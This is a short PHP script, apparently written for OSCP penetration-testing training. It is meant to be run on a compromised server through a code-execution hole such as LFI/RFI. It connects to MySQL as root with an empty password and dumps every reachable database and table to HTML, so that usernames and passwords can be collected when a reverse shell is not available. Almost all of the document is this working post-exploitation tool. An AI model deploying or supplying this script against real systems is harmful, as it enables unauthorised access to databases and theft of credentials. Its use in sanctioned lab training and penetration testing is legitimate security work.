<?php

/*
	Jean-Pierre LESUEUR
	jplesueur@phrozen.io

	https://www.twitter.com/DarkCoderSc

	Description:
	Dump all accessible databases and tables to HTML format.

	I made this script for my needs during my PWK/OSCP training for one box.

	Sometimes you can't get an interactive reverse shell (for example because of a Firewall) but
	you must access to database to grab additional usernames / passwords.

	If you find a way to execute PHP code (ex: LFI/RFI), you can use that script (minified or not) and
	get the job done ;)
*/

error_reporting(0);

$dbuser = "root";
$dbpwd  = "";
$dbhost = "localhost";

$crlf = "<br/>";

echo "Attempt connection user=[$dbuser], password=[$dbpwd], host=[$dbhost] : ";

$db = mysql_connect($dbhost, $dbuser, $dbpwd);

if (!$db){
     echo "[ KO ]$crlf";

     Exit();
} 
echo "[ OK ]$crlf";

$databases = mysql_query("SHOW DATABASES;");

while ($database = mysql_fetch_array($databases, MYSQL_NUM)) {
   $selected_db = mysql_select_db($database[0], $db);

   if (!$selected_db) {
        continue;
   } 
      
   echo "<h1>DATABASE $database[0]</h1>";   

   $tables = mysql_query("SHOW TABLES;");

   while ($table = mysql_fetch_array($tables, MYSQL_NUM)) {     
        echo "<h2>TABLE $table[0]</h2>";

        $rows = mysql_query("SELECT * FROM $table[0];");
        
        $columns_count = mysql_num_fields($rows);

        echo "<table><thead><tr>";
        for ($i = 0; $i < $columns_count; $i++) {
          $fieldname = mysql_field_name($rows, $i);
          echo "<th>" . strval($fieldname) . "</th>";
        }
        echo "</tr></thead><tbody>";

        while ($row = mysql_fetch_array($rows, MYSQL_NUM)) {
          echo "<tr>";

          for ($i = 0; $i < $columns_count; $i++) {
               echo "<td>" . $row[$i] . "</td>";
          }
          
          echo "</tr>";
        }

        echo "<tbody></table>";

   } 
} 

mysql_close($db);
?>
